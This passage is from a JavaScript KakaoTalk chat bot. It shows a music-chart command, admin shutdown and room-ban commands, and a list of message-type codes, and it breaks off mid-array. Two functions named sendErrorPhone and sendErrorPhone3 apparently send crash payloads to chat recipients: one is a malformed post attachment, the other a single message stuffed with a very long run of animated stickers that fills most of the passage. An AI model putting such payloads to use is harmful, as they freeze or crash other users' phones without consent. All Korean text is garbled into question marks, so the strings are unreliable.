              up_time_arr[0] = up_time_arr[0] - 12
              newtime = "?????? "+up_time_arr[0];
            } else {
              newtime = "?????? " +up_time_arr[0];
            }   
            // ?????? ?????? - ???????????????
            for (var i = 1; i < rank+1; i++) {
                chart += i+ "???" + " " + title[i-1] + " - " + artist[i-1] + "\n\n"
            }
            // ???????????? ??????
            chart += "("+up_date_arr[0]+"??? "+up_date_arr[1]+"??? "+up_date_arr[2]-1+"??? "+newtime+"?????? ???????????????)"
        sendLong(channel,"< ?????? ?????? 1 ~ "+rank+"??? >",chart)  
        pausecomp(110)
        }
        });
    }}


        if (data.text == prefix + "??????") {
            if (adminList.includes(id)) {
                channel.sendChat("[ ???? ] ???????????????");
                process.exit();
            }
        }

        if (data.text == prefix + "?????????") {
            channel.sendChat("?????? ?????? ??????" + "\u200b".repeat(2000) +
                "\nFEED : 0" +
                "\nTEXT : 1" +
                "\nPHOTO : 2" +
                "\nVIDEO : 3" +
                "\nCONTACT : 4" +
                "\nAUDIO : 5" +
                "\nDITEMEMOTICON : 6" +
                "\nDITEMGIFT : 7" +
                "\nDITEMIMG : 8" +
                "\nKAKAOLINKV1 : 9" +
                "\nAVATAR : 11" +
                "\nSTICKER : 12" +
                "\nSCHEDULE : 13" +
                "\nVOTE : 14" +
                "\nLOTTERY : 15" +
                "\nMAP : 16" +
                "\nPROFILE : 17" +
                "\nFILE : 18" +
                "\nSTICKERANI : 20" +
                "\nNUDGE : 21" +
                "\nACTIONCON : 22" +
                "\nSEARCH : 23" +
                "\nPOST : 24" +
                "\nSTICKERGIF : 25" +
                "\nREPLY : 26" +
                "\nMULTIPHOTO : 27" +
                "\nVOIP : 51" +
                "\nLIVETALK : 52" +
                "\nCUSTOM : 71" +
                "\nALIM : 72" +
                "\nPLUSFRIEND : 81" +
                "\nPLUSEVENT : 82" +
                "\nPLUSFRIENDVIRAL : 83" +
                "\nOPEN_SCHEDULE : 96" +
                "\nOPEN_VOTE : 97" +
                "\nOPEN_POST : 98" +
                "");
        }


        if (data.text == prefix + "?????????") {
            if (!(data.originalType == node_kakao.KnownChatType.REPLY)) {
                channel.sendChat("[ ???? ] " + sender.nickname + "?????? ID : " + id)
            }
        }




        function replaceAll(str, searchStr, replaceStr) {
            return str.split(searchStr).join(replaceStr);
          }
          




        if (data.text == prefix + "??????") {
            if (adminList.includes(id)) {
            banKey.push(roomId)
            channel.sendChat("?????? ?????? ????????? ???????????????")
        }}

        if (data.text == prefix + "?????? ??????") {
            if (adminList.includes(id)) {
                for (var getValueFor = 0; getValueFor < banKey.length; getValueFor++) {
                    if (banKey[getValueFor] == roomId) {
                        banKey.splice(getValueFor);
                    }}  
            channel.sendChat("?????? ?????? ?????? ????????? ???????????????")
        }}



        function sendErrorPhone() {
            channel.sendChat(
                new $ChatBuilder()
                .append(new node_kakao.AttachmentContent({
                    "os": [
                        {
                           "t": 5,
                           "ct": "???????????? ?????????",
                           "jct": "[{\"type\":\"text\",\"text\":\"" + "???????????? ?????????" + "\"}]"
                        },
                        {
                           "t": 5,
                           "st": 5,
                           "url": ""
                        }
                    ]
                }))
                .build(24)
            );
        }
        
        function sendErrorPhone3() {
            try {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
        
        os: [
        { t: 1, ct: "", jct: "" },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(????????????)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
